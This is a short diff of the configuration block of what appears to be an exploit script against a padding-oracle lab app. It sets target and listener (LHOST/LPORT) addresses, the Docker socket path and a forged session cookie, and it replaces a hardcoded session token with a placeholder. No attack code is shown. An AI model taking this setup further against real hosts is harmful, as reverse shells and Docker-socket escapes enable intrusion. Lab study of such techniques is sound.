@@ -19,7 +19,7 @@ TARGET      = os.environ.get("TARGET", "0.0.0.x")
 TARGET_PORT = 8080
 LHOST       = os.environ.get("LHOST", "192.x.x.x")
 LPORT       = 8888
-SESSION     = os.environ.get("SESSION", "ee10e9985e4ba185c8d00fa0bba86db507380ef6ca89c7f34366622ac779716a")
+SESSION     = os.environ.get("SESSION", "oracle session....")
 IMAGE       = "padding-oracle-app_web"
 DOCKER_SOCK = "/run/docker.sock"
 COOKIE      = f"session={SESSION}; loggedin=true"
